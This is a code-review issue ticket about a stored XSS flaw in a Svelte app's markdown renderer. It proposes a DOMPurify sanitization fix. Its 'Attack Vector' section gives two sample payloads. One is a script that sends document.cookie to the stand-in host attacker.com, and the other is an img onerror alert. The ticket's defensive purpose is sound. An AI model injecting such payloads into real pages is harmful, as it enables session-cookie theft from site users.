---
status: complete
priority: p1
issue_id: "001"
tags: [code-review, security, xss]
dependencies: []
---

# XSS Vulnerability: Unsanitized Markdown Rendering

## Problem Statement

The markdown parser renders user content without sanitization, creating a stored XSS vulnerability. The `parseMarkdown()` function uses marked library without DOMPurify, and the output is rendered via Svelte's `{@html}` directive.

## Findings

**Source:** Security Sentinel Agent

**Evidence:**
- `src/lib/utils/markdown.ts` lines 35-37: No sanitization of marked output
- `src/lib/components/NoteCard.svelte` line 408: Direct `{@html html}` rendering
- Wikilink renderer at lines 27-30 also lacks attribute escaping

**Attack Vector:**
```markdown
<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>
<img src=x onerror="alert('XSS')">
```

## Proposed Solutions

### Option A: Add DOMPurify (Recommended)
- **Pros:** Industry standard, well-maintained, minimal performance impact
- **Cons:** Adds ~7KB dependency
- **Effort:** Small (1-2 hours)
- **Risk:** Low

```typescript
import DOMPurify from 'dompurify';

export function parseMarkdown(content: string): string {
    const rawHtml = marked.parse(content, { async: false }) as string;
    return DOMPurify.sanitize(rawHtml, {
        ALLOWED_TAGS: ['h1', 'h2', 'h3', 'p', 'ul', 'ol', 'li', 'code', 'pre', 'strong', 'em', 'button', 'blockquote'],
        ALLOWED_ATTR: ['class', 'data-target', 'type']
    });
}
```

### Option B: Use marked's sanitize option
- **Pros:** No new dependency
- **Cons:** Less robust than DOMPurify, deprecated in newer versions
- **Effort:** Small
- **Risk:** Medium

## Recommended Action

<!-- To be filled during triage -->

## Technical Details

### Affected Files
- `src/lib/utils/markdown.ts`
- `src/lib/components/NoteCard.svelte`

### Components
- Markdown parser
- NoteCard view mode

## Acceptance Criteria

- [ ] DOMPurify installed and configured
- [ ] All markdown output sanitized before rendering
- [ ] Wikilink attributes properly escaped
- [ ] XSS payloads blocked in testing
- [ ] No visual regression in note rendering

## Work Log

| Date | Action | Notes |
|------|--------|-------|
| 2025-01-15 | Created | Identified by security-sentinel agent |

## Resources

- [DOMPurify GitHub](https://github.com/cure53/DOMPurify)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
